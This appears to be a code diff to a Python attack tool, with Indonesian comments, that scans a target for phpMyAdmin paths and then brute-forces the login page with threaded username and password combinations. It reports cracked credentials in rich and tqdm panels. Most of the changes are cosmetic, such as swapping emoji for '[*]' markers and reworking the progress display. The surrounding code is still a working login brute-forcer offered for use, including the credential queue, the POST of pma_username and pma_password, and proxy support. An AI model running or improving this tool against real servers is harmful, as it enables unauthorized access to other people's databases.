@@ -37,6 +37,7 @@ try:
     from rich.align import Align
     from rich.live import Live
     from rich.layout import Layout
+    from rich.progress import Progress, BarColumn, TextColumn, TimeElapsedColumn, TimeRemainingColumn
     RICH_AVAILABLE = True
     console = Console()
 except ImportError:
@@ -228,70 +229,108 @@ class UltraFastTargetScanner:
         total = len(common_paths)
         
         if RICH_AVAILABLE:
-            from rich.progress import Progress, BarColumn, TextColumn, TimeElapsedColumn, TimeRemainingColumn
             progress_columns = [
-                TextColumn("{task.description}"),
+                TextColumn("[progress.description]{task.description}"),
                 BarColumn(bar_width=None),
-                TextColumn("{task.completed}/{task.total}"),
+                TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
                 TimeElapsedColumn(),
                 TimeRemainingColumn(),
             ]
         
-            def build_status_panel(current_path, tested_count, found_count):
+            def build_status_panel(current_path, tested_count, found_count, found_paths_list):
                 table = Table.grid(expand=True)
                 table.add_column(ratio=3)
                 table.add_column(ratio=1, justify="right")
+                
+                # Build found paths info
+                found_info = ""
+                if found_paths_list:
+                    found_info = "\n\n[bold green]Found Paths:[/bold green]"
+                    for i, found_path in enumerate(found_paths_list[:3]):  # Show max 3 paths
+                        found_info += f"\n  {i+1}. {found_path}"
+                    if len(found_paths_list) > 3:
+                        found_info += f"\n  ... and {len(found_paths_list) - 3} more"
+                
                 left = (
-                    f"🔄 Testing: [bold]{current_path}[/bold]\n"
-                    f"🧭 Tested: [cyan]{tested_count}/{total}[/cyan]\n"
-                    f"✅ Found: [green]{found_count}[/green]"
+                    f"[*] [bold cyan]Fuzzing:[/bold cyan] [yellow]{current_path}[/yellow]\n"
+                    f"[*] [bold blue]Tested:[/bold blue] [cyan]{tested_count}/{total}[/cyan]\n"
+                    f"[*] [bold green]Found:[/bold green] [green]{found_count}[/green]"
+                    f"{found_info}"
                 )
-                right = f"Target: [bold]{self.base_target}[/bold]"
-                table.add_row(left, right)
-                return Panel(table, title="📡 Scan Status", border_style="magenta", padding=(1, 2))
+                #left = f"🎯 [bold]Target:[/bold]\n[white]{self.base_target}[/white]"
+                table.add_row(left)
+                return Panel(table, title="Fuzzing Status", border_style="magenta", padding=(1, 2))
 
             with Progress(*progress_columns, console=console, transient=False) as progress:
-                task = progress.add_task("Scanning paths...", total=total)
-                with Live(build_status_panel("-", 0, 0), refresh_per_second=6, console=console) as live:
+                task = progress.add_task("[cyan]Scanning phpMyAdmin paths...", total=total)
+                found_paths_list = []
+                
+                with Live(build_status_panel("-", 0, 0, []), refresh_per_second=6, console=console) as live:
                     tested = 0
                     found_count = 0
                     for path in common_paths:
                         current_path = path or "/"
-                        progress.update(task, description=f"Testing: {current_path}", advance=1)
+                        progress.update(task, description=f"[cyan]Fuzzing: {current_path[:30]}...", advance=1)
                         test_url = f"{self.base_target.rstrip('/')}" + current_path
                         status_info = self.check_url_status(test_url)
                         tested += 1
+                        
                         if status_info.get("accessible"):
                             self.found_paths.append(status_info)
                             found_count += 1
+                            found_paths_list.append(current_path)
+                            
+                            # Update dengan path yang ditemukan
+                            live.update(build_status_panel(current_path, tested, found_count, found_paths_list))
 
-                        # update live panel with concise info
-                        live.update(build_status_panel(current_path, tested, found_count))
+                        # update live panel dengan info terkini
+                        live.update(build_status_panel(current_path, tested, found_count, found_paths_list))
                         # tiny sleep to avoid terminal flooding when scanning extremely fast
                         time.sleep(0.005)
         else:
             # fallback behavior: tqdm or simple loop
             if TQDM_AVAILABLE:
-                progress_bar = tqdm(total=total, desc="Scanning paths", unit="path", ncols=80)
+                progress_bar = tqdm(total=total, desc="Scanning paths", unit="path", ncols=100)
             else:
                 progress_bar = None
+                print(f"[*] Scanning {total} phpMyAdmin paths...")
+            
             found_count = 0
             tested = 0
+            found_paths_list = []
+            
             for path in common_paths:
                 tested += 1
-                test_url = f"{self.base_target.rstrip('/')}" + (path or "/")
+                current_path = path or "/"
+                test_url = f"{self.base_target.rstrip('/')}" + current_path
+                
+                # Tampilkan path yang sedang di-test
                 if TQDM_AVAILABLE:
-                    tqdm.write(f"🔍 [{tested:3d}/{total:3d}] Testing: {path or '/'}")
-                status_info = self.check_url_status(test_url)
-                if progress_bar:
+                    progress_bar.set_description(f"Testing: {current_path[:40]:<40}")
                     progress_bar.update(1)
+                else:
+                    print(f"[*] [{tested:3d}/{total:3d}] Testing: {current_path}")
+                
+                status_info = self.check_url_status(test_url)
+                
                 if status_info.get("accessible"):
                     self.found_paths.append(status_info)
                     found_count += 1
+                    found_paths_list.append(current_path)
+                    
                     if TQDM_AVAILABLE:
-                        tqdm.write(f"✅ FOUND: {path or '/'} -> {status_info['url']}")
+                        tqdm.write(f"[*] [FOUND] {current_path} -> {status_info['url']}")
+                    else:
+                        print(f"[*] [FOUND] {current_path} -> {status_info['url']}")
+            
             if progress_bar:
                 progress_bar.close()
+            
+            # Tampilkan summary paths yang ditemukan
+            if found_paths_list:
+                print("\n[*] [SUMMARY] Found phpMyAdmin paths:")
+                for i, path in enumerate(found_paths_list, 1):
+                    print(f"  {i}. {path}")
         
         if self.found_paths and RICH_AVAILABLE:
             self.display_scan_results()
@@ -408,20 +447,6 @@ class UltraFastTargetScanner:
         
         return "Unknown"
     
-    def is_valid_version(self, version_str):
-        """Validate jika string adalah version yang valid"""
-        if not version_str:
-            return False
-        
-        if re.match(r'^\d+\.\d+(\.\d+)?$', version_str):
-            parts = version_str.split('.')
-            if all(0 <= int(part) < 1000 for part in parts if part.isdigit()):
-                major_version = int(parts[0])
-                if 2 <= major_version <= 5:
-                    return True
-        
-        return False
-    
     def extract_title(self, html):
         """Extract title dari HTML"""
         title_match = re.search(r'<title>(.*?)</title>', html, re.IGNORECASE)
@@ -433,23 +458,25 @@ class UltraFastTargetScanner:
             return
         
         table = Table(
-            title="🎯 Target Discovery Results", 
+            title="[*] Target Discovery Results", 
             box=box.DOUBLE_EDGE, 
             show_header=True, 
             header_style="bold magenta"
         )
         table.add_column("Status", style="bold", width=30, overflow="fold")
-        table.add_column("URL", style="cyan", overflow="fold", width=30)
+        table.add_column("Path", style="cyan", overflow="fold", width=30)
+        table.add_column("URL", style="blue", overflow="fold", width=30)
         table.add_column("Code", justify="center", width=30, overflow="fold")
-        table.add_column("Server", style="yellow", width=30, overflow="fold")
-        table.add_column("SSL", justify="center", width=30)
-        table.add_column("Version", style="bold green", justify="center", width=30, overflow="fold")
+        table.add_column("Server", style="yellow", overflow="fold", width=30)
+        table.add_column("V", style="bold green", justify="center", width=30, overflow="fold")
         
         for result in self.found_paths:
             status_emoji = self.get_status_emoji(result['status_code'])
-            ssl_icon = "🔐" if result["ssl"] else "🌐"
             status_code = result['status_code']
             version = result.get("version", "Unknown")
+            
+            # Extract path from URL
+            path = "/" + result['url'].split('/', 3)[-1] if '/' in result['url'].split('//', 1)[-1] else "/"
             
             version_display = version
             if version != "Unknown":
@@ -459,16 +486,16 @@ class UltraFastTargetScanner:
             
             table.add_row(
                 f"{status_emoji}",
-                f"{result['url']}",
+                f"{path}",
+                f"{result['url'][:40]}...",
                 f"[bold]{status_code}[/bold]",
                 result['server'][:15],
-                ssl_icon,
                 version_display,
             )
         
         results_panel = Panel(
             table,
-            title="📊 SCAN COMPLETED",
+            title=f"[*] SCAN COMPLETED - Found {len(self.found_paths)} paths",
             border_style="green",
             padding=(1, 1)
         )
@@ -569,10 +596,10 @@ class UltraFastPhpMyAdminBruteforce:
         
         if RICH_AVAILABLE:
             console.print(Panel(
-                f"📊 [cyan]Credential Queue Preparation[/cyan]\n"
-                f"👥 Usernames: [yellow]{len(usernames)}[/yellow]\n"
-                f"🔑 Passwords: [yellow]{len(passwords)}[/yellow]\n"
-                f"🎯 Total Combinations: [red]{total_combinations:,}[/red]",
+                f"[*] [cyan]Credential Queue Preparation[/cyan]\n"
+                f"[*] Usernames: [yellow]{len(usernames)}[/yellow]\n"
+                f"[*] Passwords: [yellow]{len(passwords)}[/yellow]\n"
+                f"[*] Total Combinations: [red]{total_combinations:,}[/red]",
                 border_style="blue",
                 padding=(1, 2)
             ))
@@ -614,12 +641,13 @@ class UltraFastPhpMyAdminBruteforce:
         return session
     
     def run(self):
+        """Main execution"""
         # Phase 1: Fast Target Scanning
         found_paths = self.target_scanner.scan_paths()
         if not found_paths:
             if RICH_AVAILABLE:
                 console.print(Panel(
-                    "❌ [bold red]TARGET DISCOVERY FAILED[/bold red]\n"
+                    "[*] [bold red]TARGET DISCOVERY FAILED[/bold red]\n"
                     "No accessible phpMyAdmin paths found!",
                     border_style="red",
                     padding=(1, 2)
@@ -638,11 +666,11 @@ class UltraFastPhpMyAdminBruteforce:
         """Start bruteforce dengan progress bar yang tepat"""
         if RICH_AVAILABLE:
             console.print(Panel(
-                f"🔥 [bold red]BRUTEFORCE CONFIGURATION[/bold red]\n"
-                f"🎯 Target: [cyan]{target_url}[/cyan]\n"
-                f"📊 Total Combinations: [yellow]{self.total_attempts:,}[/yellow]\n"
-                f"🚀 Threads: [green]{self.threads}[/green]\n"
-                f"⚡ Delay: [blue]{self.delay}s[/blue]",
+                f"[*] [bold red]BRUTEFORCE CONFIGURATION[/bold red]\n"
+                f"[*] Target: [cyan]{target_url}[/cyan]\n"
+                f"[*] Total Combinations: [yellow]{self.total_attempts:,}[/yellow]\n"
+                f"[*] Threads: [green]{self.threads}[/green]\n"
+                f"[*] Delay: [blue]{self.delay}s[/blue]",
                 border_style="red",
                 padding=(1, 2)
             ))
@@ -651,17 +679,16 @@ class UltraFastPhpMyAdminBruteforce:
         if TQDM_AVAILABLE:
             self.progress_bar = tqdm(
                 total=self.total_attempts,
-                desc="Bruteforcing",
+                desc="Crack",
                 unit="attempt",
                 dynamic_ncols=True,
                 bar_format="{l_bar}{bar:20}| {n_fmt}/{total_fmt} [{elapsed}<{remaining}, {rate_fmt}{postfix}]",
-                position=0,  # PASTIKAN di position 0
-                leave=True   # Biarkan progress bar setelah selesai
+                position=0,
+                leave=True
             )
-            # Tambah postfix untuk info tambahan
             self.progress_bar.set_postfix_str("Starting...")
         else:
-            console.print(f"🔄 Starting bruteforce with {self.total_attempts:,} combinations...")
+            console.print(f"[*] Starting bruteforce with {self.total_attempts:,} combinations...")
         
         self.results["start_time"] = time.time()
         
@@ -686,7 +713,7 @@ class UltraFastPhpMyAdminBruteforce:
                    self.results["attempts"] < self.total_attempts and
                    not self.credentials_found):
                 
-                time.sleep(0.5)  # Update setiap 0.5 detik
+                time.sleep(0.5)
                 
                 # Calculate current speed
                 current_time = time.time()
@@ -697,7 +724,6 @@ class UltraFastPhpMyAdminBruteforce:
                     current_speed = attempts_diff / time_diff
                     self.results["current_speed"] = current_speed
                     
-                    # Update progress bar postfix
                     if TQDM_AVAILABLE and self.progress_bar:
                         elapsed = current_time - self.results["start_time"]
                         eta = (self.total_attempts - self.results["attempts"]) / current_speed if current_speed > 0 else 0
@@ -707,16 +733,14 @@ class UltraFastPhpMyAdminBruteforce:
                 last_attempts = self.results["attempts"]
                 last_time = current_time
                 
-                # Check jika semua kombinasi sudah dicoba
                 if self.credential_queue.empty():
                     break
                     
         except KeyboardInterrupt:
             self.stop_event.set()
             if RICH_AVAILABLE:
-                console.print("\n🛑 [yellow]Bruteforce interrupted by user[/yellow]")
+                console.print("\n[*] [yellow]Bruteforce interrupted by user[/yellow]")
         
-        # Tunggu semua thread selesai
         self.stop_event.set()
         for thread in threads:
             thread.join(timeout=2)
@@ -729,11 +753,11 @@ class UltraFastPhpMyAdminBruteforce:
         if RICH_AVAILABLE:
             attempts_per_second = self.results["attempts"] / elapsed_time if elapsed_time > 0 else 0
             console.print(Panel(
-                f"⏰ [cyan]Execution Time:[/cyan] {elapsed_time:.2f} seconds\n"
-                f"📈 [green]Average Speed:[/green] {attempts_per_second:,.1f} attempts/second\n"
-                f"📊 [yellow]Peak Speed:[/yellow] {self.results['current_speed']:,.1f} attempts/second\n"
-                f"🎯 [bold magenta]Status:[/bold magenta] {'COMPLETED' if not self.credentials_found else 'CREDENTIALS FOUND'}",
-                title="📊 EXECUTION SUMMARY",
+                f"[*] [cyan]Execution Time:[/cyan] {elapsed_time:.2f} seconds\n"
+                f"[*] [green]Average Speed:[/green] {attempts_per_second:,.1f} attempts/second\n"
+                f"[*] [yellow]Peak Speed:[/yellow] {self.results['current_speed']:,.1f} attempts/second\n"
+                f"[*] [bold magenta]Status:[/bold magenta] {'COMPLETED' if not self.credentials_found else 'CREDENTIALS FOUND'}",
+                title="[*] EXECUTION SUMMARY",
                 border_style="cyan",
                 padding=(1, 2)
             ))
@@ -747,10 +771,9 @@ class UltraFastPhpMyAdminBruteforce:
                self.results["attempts"] < self.total_attempts):
             
             try:
-                # Ambil credential dari queue dengan timeout
                 username, password = self.credential_queue.get(timeout=1)
             except:
-                break  # Queue kosong atau timeout
+                break
             
             success = self.try_login(session, target_url, username, password)
             
@@ -764,33 +787,29 @@ class UltraFastPhpMyAdminBruteforce:
                     self.stop_event.set()
                     
                     if RICH_AVAILABLE:
-                        # Clear progress bar area sebelum print success
                         if TQDM_AVAILABLE and self.progress_bar:
                             self.progress_bar.clear()
                         
                         console.print("\n" + "="*70)
                         success_panel = Panel(
-                            f"🎉 [bold green]CREDENTIALS SUCCESSFULLY CRACKED![/bold green]\n\n"
-                            f"👤 [cyan]Username:[/cyan] {username}\n"
-                            f"🔑 [yellow]Password:[/yellow] {password}\n"
-                            f"📊 [blue]Attempts Made:[/blue] {self.results['attempts']:,}\n"
-                            f"⏰ [magenta]Progress:[/magenta] {self.results['attempts']:,}/{self.total_attempts:,}",
-                            title="💎 SUCCESS",
+                            f"[*] [bold green]CREDENTIALS SUCCESSFULLY CRACKED![/bold green]\n\n"
+                            f"[*] [cyan]Username:[/cyan] {username}\n"
+                            f"[*] [yellow]Password:[/yellow] {password}\n"
+                            f"[*] [blue]Attempts Made:[/blue] {self.results['attempts']:,}\n"
+                            f"[*] [magenta]Progress:[/magenta] {self.results['attempts']:,}/{self.total_attempts:,}",
+                            title="[*] SUCCESS",
                             border_style="bright_green",
                             padding=(2, 3)
                         )
                         console.print(success_panel)
                         console.print("="*70)
             
-            # Update progress bar - HANYA di worker utama
             if TQDM_AVAILABLE and self.progress_bar and not self.credentials_found:
                 self.progress_bar.update(1)
             
-            # Delay
             if self.delay > 0:
                 time.sleep(self.delay)
             
-            # Tandai task selesai
             self.credential_queue.task_done()
         
         session.close()
@@ -800,7 +819,6 @@ class UltraFastPhpMyAdminBruteforce:
         login_url = f"{target_url}/index.php"
         
         try:
-            # Get login page
             response = session.get(
                 login_url,
                 verify=self.ssl_verify,
@@ -808,14 +826,12 @@ class UltraFastPhpMyAdminBruteforce:
                 proxies=self.proxies
             )
             
-            # Simple login data
             data = {
                 'pma_username': username,
                 'pma_password': password,
                 'server': '1',
             }
             
-            # Attempt login
             response = session.post(
                 login_url,
                 data=data,
@@ -836,16 +852,16 @@ class UltraFastPhpMyAdminBruteforce:
             return
             
         summary_content = (
-            f"🎯 [bold cyan]Target:[/bold cyan] {self.options.get('TARGET')}\n"
-            f"⏰ [bold yellow]Total Attempts:[/bold yellow] {self.results['attempts']:,}\n"
-            f"✅ [bold green]Successful Logins:[/bold green] {self.results['successful_attempts']}\n"
-            f"🔑 [bold red]Credentials Found:[/bold red] {len(self.results['found_credentials'])}\n"
-            f"📊 [bold magenta]Total Combinations:[/bold magenta] {self.total_attempts:,}"
+            f"[*] [bold cyan]Target:[/bold cyan] {self.options.get('TARGET')}\n"
+            f"[*] [bold yellow]Total Attempts:[/bold yellow] {self.results['attempts']:,}\n"
+            f"[*] [bold green]Successful Logins:[/bold green] {self.results['successful_attempts']}\n"
+            f"[*] [bold red]Credentials Found:[/bold red] {len(self.results['found_credentials'])}\n"
+            f"[*] [bold magenta]Total Combinations:[/bold magenta] {self.total_attempts:,}"
         )
         
         summary_panel = Panel(
             summary_content,
-            title="📊 FINAL RESULTS SUMMARY",
+            title="FINAL RESULTS SUMMARY",
             border_style="bright_blue",
             padding=(1, 2)
         )
@@ -854,7 +870,7 @@ class UltraFastPhpMyAdminBruteforce:
         
         if self.results["found_credentials"]:
             table = Table(
-                title="🎉 CRACKED CREDENTIALS", 
+                title="[*] CRACKED CREDENTIALS", 
                 box=box.DOUBLE_EDGE, 
                 header_style="bold green"
             )
@@ -867,7 +883,7 @@ class UltraFastPhpMyAdminBruteforce:
             
             credentials_panel = Panel(
                 table,
-                title="💎 SUCCESSFUL CRACKS",
+                title="[*] SUCCESSFUL CRACKS",
                 border_style="green",
                 padding=(1, 1)
             )
